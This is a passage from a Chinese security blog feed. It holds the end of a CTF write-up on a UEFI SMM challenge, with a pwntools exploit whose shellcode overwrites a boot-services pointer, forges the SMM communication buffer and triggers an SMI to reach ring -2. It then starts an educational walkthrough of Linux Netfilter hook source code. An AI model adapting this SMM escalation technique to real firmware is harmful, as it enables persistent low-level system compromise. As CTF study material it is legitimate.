OPTIONAL</span><br><span class="hljs-params">  )</span>;<br><br><span class="hljs-keyword">typedef</span>  EFI_MM_HANDLER_ENTRY_POINT      EFI_SMM_HANDLER_ENTRY_POINT2;<br></code></pre></td></tr></table></figure><p>ToySMM中注册的是ToyMain函数</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/registersmm.png" class title="registersmm"><h3 id="gcSmiHandlerTemplate"><a href="#gcSmiHandlerTemplate" class="headerlink" title="gcSmiHandlerTemplate"></a>gcSmiHandlerTemplate</h3><p>通过SMI进入SMM后：</p><ul><li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li><li>执行SMBASE + 0x8000处的代码</li></ul><p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p><p>函数调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">gcSmiHandlerTemplate<br>-&gt; SmiRendezvous<br>-&gt; BSPHandler<br>-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry<br>   SmmEntryPoint<br>-&gt; SmiManage (IMAGE, GUID, CommBuffer)<br></code></pre></td></tr></table></figure><p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Status             = SmiHandler-&gt;Handler (<br>                                   (EFI_HANDLE)SmiHandler,<br>                                   Context,<br>                                   CommBuffer,<br>                                   CommBufferSize<br>                                   );<br></code></pre></td></tr></table></figure><ul><li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，gSmmCorePrivate是个全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">……<br>  <br>   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;<br>   BufferSize          = gSmmCorePrivate-&gt;BufferSize;<br>  <br>……<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;<br>       <span class="hljs-comment">// BufferSize was updated by the SafeUintnSub() call above.</span><br>       Status = SmiManage (<br>                  &amp;CommunicateHeader-&gt;HeaderGuid,<br>                  <span class="hljs-literal">NULL</span>,<br>                  CommunicateHeader-&gt;Data,<br>                  &amp;BufferSize<br>                  );<br>   ……<br></code></pre></td></tr></table></figure></li><li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiManage</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN     CONST EFI_GUID  *HandlerType,</span><br><span class="hljs-params">  IN     CONST VOID      *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span><br><span class="hljs-params">  )</span><br>&#123;<br>    ……<br>    <br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Non-root SMI handler</span><br>    <span class="hljs-comment">//</span><br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);<br>    <br>    ……<br>    <br>    Status             = SmiHandler-&gt;Handler (<br>                                       (EFI_HANDLE)SmiHandler,<br>                                       Context,<br>                                       CommBuffer,<br>                                       CommBufferSize<br>                                       );<br>    <br>    ……<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li><p>ToyApp处于ring 0，读取真的flag需要ring -2</p></li><li><p>ToyApp已经给了执行shellcode的功能，可以直接写shellcode发出SMI进入ring -2</p></li><li><p>SMI执行的handler由mSmmCorePrivateData全局变量决定，可以通过shellcode更改mSmmCorePrivateData</p></li><li><p>ToySMM的handler中调用了gBS-&gt;LocateProtocol，可以更改这个函数指针为PrintFlag来绕过&amp;aaaa &#x3D;&#x3D; (int *)0x23330000 &amp;&amp; cmpString((_BYTE *)0x23330000, &amp;aaaa, 3i64)</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/change.png" class title="change"><p>这题第一次上的时候附件还有问题，&amp;aaaa !&#x3D; (int *)0x23330000 || !StringCmp(0x23330000i64, &amp;aaaa, 3i64)，乐</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/old.png" class title="old"></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>来自呆神</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>p = process(<span class="hljs-string">&quot;./run.sh&quot;</span>, shell=<span class="hljs-literal">True</span>)<br><br>ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x)<br>sn = <span class="hljs-keyword">lambda</span> x : p.send(x)<br>rl = <span class="hljs-keyword">lambda</span> : p.recvline()<br>sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)<br>rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)<br>sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)<br>sla = <span class="hljs-keyword">lambda</span> a,b : p.sendlineafter(a, b)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>smm_buffer = <span class="hljs-number">0x6ad9380</span><br>guid = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)<br>CommBuffer_offset = <span class="hljs-number">56</span><br>BufferSize_offset = CommBuffer_offset + <span class="hljs-number">8</span><br>ReturnStatus_offset = BufferSize_offset + <span class="hljs-number">8</span><br>bootservice = <span class="hljs-number">0x6FD6B80</span><br>backdoor = <span class="hljs-number">0x7F06000</span><br>payload = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              </span><br><span class="hljs-string">mov rcx, 0x6FD6B80/* gBS-&gt;LocateProtocol = PrintFlag */</span><br><span class="hljs-string">add rcx, 0x140</span><br><span class="hljs-string">mov rdx, 0x7F06000</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad9400/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span><br><span class="hljs-string">mov rdx, 0xEC86B7F3B31CF11E</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string">mov rdx, 0x9D76F4B1548E0872</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8/* CommBuffer-&gt;MessageLength = 4 */</span><br><span class="hljs-string">mov rdx, 0x4</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 24/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span><br><span class="hljs-string">mov rdx, 0x41414141</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad93b8/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span><br><span class="hljs-string">mov rdx, 0x6ad9400</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span><br><span class="hljs-string">mov rdx, 0x1c</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor eax, eax/* SMI */</span><br><span class="hljs-string">mov dx, 0xb2</span><br><span class="hljs-string">mov al, 0x00</span><br><span class="hljs-string">outb dx, al</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;Your shellcode:&#x27;</span>)<br>raw_input(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>sl(payload.<span class="hljs-built_in">hex</span>())<br>sl(<span class="hljs-string">&quot;DONE&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nft源码分析</title>
    <link href="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>非常好nft，L3HCTF见到了，学之👈</p><span id="more"></span><h1 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h1><p><strong>Netfilter</strong> 通过在网络协议栈的不同阶段注册钩子函数来实现对数据包的处理与过滤，过滤位于 <strong>IP</strong> 层</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ip.png" class title="ip"><ul><li><p>Netfilter提供了5个HOOK点（包处理的不同阶段），区分的重要节点是 <strong>路由判决</strong>（是发往本地的包还是中转的包）</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/hook.png" class title="hook"><ul><li><strong>PRE_ROUTING</strong>：刚收到包，路由判断前</li><li><strong>LOCAL_IN</strong>：路由判决结束，是发往本地的包</li><li><strong>FORWARD</strong>：路由判决结束，是中转的包</li><li><strong>LOCAL_OUT</strong>：路由判决前，本地要发出的包</li><li><strong>POST_ROUTING</strong>：路由判决后，发出的包</li></ul></li><li><p>实际上不同的协议hook略有区别</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/hooks.png" class title="hooks"><p>源码中有相关的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_inet_hooks</span> &#123;</span><br>NF_INET_PRE_ROUTING,<br>NF_INET_LOCAL_IN,<br>NF_INET_FORWARD,<br>NF_INET_LOCAL_OUT,<br>NF_INET_POST_ROUTING,<br>NF_INET_NUMHOOKS,<br>NF_INET_INGRESS = NF_INET_NUMHOOKS,<br>&#125;;<br><br><span class="hljs-comment">/* ARP Hooks */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_IN0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_OUT1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_FORWARD2</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="hook挂载：NF-INET-XXX"><a href="#hook挂载：NF-INET-XXX" class="headerlink" title="hook挂载：NF_INET_XXX"></a>hook挂载：NF_INET_XXX</h2><p>先康康在哪些函数里调用了hook函数</p><p>附一张IPv4的函数调用关系图</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function.png" class title="function"><ul><li><p>NF_INET_PRE_ROUTING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * IP receive entry point</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-keyword">struct</span> packet_type *pt,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br>    <span class="hljs-comment">/* IP数据报的合法性检查和一些必要字段设置 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(dev);<br><br>skb = ip_rcv_core(skb, net);<br><span class="hljs-keyword">if</span> (skb == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br><br>    <span class="hljs-comment">/* 经过NF_INET_PRE_ROUTING hook点 */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,<br>       net, <span class="hljs-literal">NULL</span>, skb, dev, <span class="hljs-literal">NULL</span>,<br>       ip_rcv_finish);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_LOCAL_IN</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *分片重组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(skb-&gt;dev);<br><br><span class="hljs-keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;<br><span class="hljs-keyword">if</span> (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">/* 经过NF_INET_LOCAL_IN hook点 */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, <span class="hljs-literal">NULL</span>,<br>       ip_local_deliver_finish);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_FORWARD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_forward</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 合法性检查</span><br><span class="hljs-comment">     */</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *递减TTL，判断是否需要icmp</span><br><span class="hljs-comment"> */</span><br><br>    <span class="hljs-comment">/* 经过NF_INET_FORWARD hook点 */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_FORWARD,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, rt-&gt;dst.dev,<br>       ip_forward_finish);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  * 错误处理</span><br><span class="hljs-comment">  */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_LOCAL_OUT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __ip_local_out(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span> =</span> ip_hdr(skb);<br><br>    <span class="hljs-comment">/* 计算总长度 */</span><br>iph-&gt;tot_len = htons(skb-&gt;len);<br><span class="hljs-comment">/* 计算校验和 */</span><br>    ip_send_check(iph);<br><br><span class="hljs-comment">/* if egress device is enslaved to an L3 master device pass the</span><br><span class="hljs-comment"> * skb to its handler for processing</span><br><span class="hljs-comment"> */</span><br>skb = l3mdev_ip_out(sk, skb);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* 设置ip协议 */</span><br>skb-&gt;protocol = htons(ETH_P_IP);<br><br>    <span class="hljs-comment">/* 经过NF_INET_LOCAL_OUT hook点 */</span><br><span class="hljs-keyword">return</span> nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT,<br>       net, sk, skb, <span class="hljs-literal">NULL</span>, skb_dst(skb)-&gt;dev,<br>       dst_output);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_POST_ROUTING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">dev</span> =</span> skb_dst(skb)-&gt;dev, *indev = skb-&gt;dev;<br><br>IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-&gt;len);<br><br>    <span class="hljs-comment">/* 输出设备和协议 */</span><br>skb-&gt;dev = dev;<br>skb-&gt;protocol = htons(ETH_P_IP);<br><br>    <span class="hljs-comment">/* 经过NF_INET_POST_ROUTING hook点 */</span><br><span class="hljs-keyword">return</span> NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING,<br>    net, sk, skb, indev, dev,<br>    ip_finish_output,<br>    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));<br>&#125;<br>EXPORT_SYMBOL(ip_output);<br></code></pre></td></tr></table></figure></li></ul><p>再放两张bridge的hook点的图</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/bridge1.png" class title="bridge1"><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/bridge2.png" class title="bridge2"><h2 id="hook执行：NF-HOOK"><a href="#hook执行：NF-HOOK" class="headerlink" title="hook执行：NF_HOOK"></a>hook执行：NF_HOOK</h2><p>看看NF_HOOK函数是怎么执行注册的过滤函数的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">NF_HOOK</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> pf, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook, <span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> net_device *in, <span class="hljs-keyword">struct</span> net_device *out,</span><br><span class="hljs-params"><span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br><span class="hljs-type">int</span> ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">1</span>)<br>ret = okfn(net, sk, skb);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用nf_hook执行hook，成功则执行接下来要执行的函数okfn，如</p><ul><li><strong>ip_rcv</strong> 👉 <strong>ip_rcv_finish</strong></li><li><strong>ip_local_deliver</strong> 👉 <strong>ip_local_deliver_finish</strong></li><li><strong>ip_forward</strong> 👉 <strong>ip_forward_finish</strong></li><li><strong>ip_output</strong> 👉 <strong>ip_output_finish</strong></li></ul><p>详情可见👆函数调用图和hook点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_hook</span><span class="hljs-params">(<span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook, <span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> net_device *indev, <span class="hljs-keyword">struct</span> net_device *outdev,</span><br><span class="hljs-params">  <span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">hook_head</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 优化一些几乎始终为真或者始终为假的分支</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_JUMP_LABEL</span><br><span class="hljs-keyword">if</span> (__builtin_constant_p(pf) &amp;&amp;<br>    __builtin_constant_p(hook) &amp;&amp;<br>    !static_key_false(&amp;nf_hooks_needed[pf][hook]))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 从对应namespace中取对应hook点的hook链</span><br><span class="hljs-comment">     */</span><br>rcu_read_lock();<br><span class="hljs-keyword">switch</span> (pf) &#123;<br><span class="hljs-keyword">case</span> NFPROTO_IPV4:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_ipv4[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_IPV6:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_ipv6[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_ARP:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_ARP</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(hook &gt;= ARRAY_SIZE(net-&gt;nf.hooks_arp)))<br><span class="hljs-keyword">break</span>;<br>hook_head = rcu_dereference(net-&gt;nf.hooks_arp[hook]);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_BRIDGE:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_BRIDGE</span><br>hook_head = rcu_dereference(net-&gt;nf.hooks_bridge[hook]);<br><span class="hljs-meta">#<span 